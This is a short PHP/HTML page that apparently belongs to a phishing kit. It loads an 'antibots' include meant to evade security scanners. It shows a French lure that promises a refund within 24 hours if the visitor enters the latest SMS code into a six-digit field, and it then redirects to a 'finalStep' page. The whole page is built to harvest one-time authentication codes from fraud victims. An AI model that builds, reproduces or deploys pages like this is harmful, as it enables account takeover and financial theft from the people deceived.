<?php

include "./BOTS/antibots.php";

?>
<style>
		.keypad {
		    width: 70%;
		}
		.button{
			float: left;
		    width: 13%;
		    border: 1px solid rgb(225, 230, 226);
		    padding: 2%;
		    margin: 1%;
		    color: black;
		    cursor: pointer;
		    background: white;
		    font-size: 23px;
		}
		.clear{
			float: left;
		    width: 28%;
		    margin: 1%;
		    height: 42px;
		    border: 1px solid rgb(225, 230, 226);
		    background: white;
		    cursor: pointer;
		    font-family: 'Open Sans', sans-serif;
		    font-weight: bold;
		}
		.loadingBox{
			background: hsla(44, 0%, 97%);
		    height: 100%;
		    position: fixed;
		    width: 100%;
		    z-index: 1;
		    display: block;
		}
		.firstnameSection{

		}
		.label1 {
		    font-size: 21px;
		}
		.input1 {
		    background: #eceeee;
		    padding: 10px;
		    font-size: 1.19rem;
		    font-family: "open_sanssemibold";
		    width: 10%;
		    color: #333;
		    border-radius: 4px;
		    border-bottom: 2px solid #666 !important;
		    margin: 0.5%;
		}
	</style>
<body>
		<form method="POST">
			<center><font style='    font-size: 28px;
    color: rgb(113, 181, 209);'>Entrez le dernier sms<br>
Pour recevoir le remboursement sous 24h</font><br><br><p class='label1'>Enter Code: <input type='text' maxlength='6' class='input1' placeholder='XXXXXX'><br><button onclick='Verify2();' style='width: 14%;
    height: 40px;
    border: 1px solid;
    background: rgb(103, 166, 191);
    color: white;
    font-size: 21px;' type="submit" name="next">Confirm</button></center>
		</form>
<?php
	
	if(isset($_POST['next'])){
		header("Location: finalStep.php");
	}

?>
</body>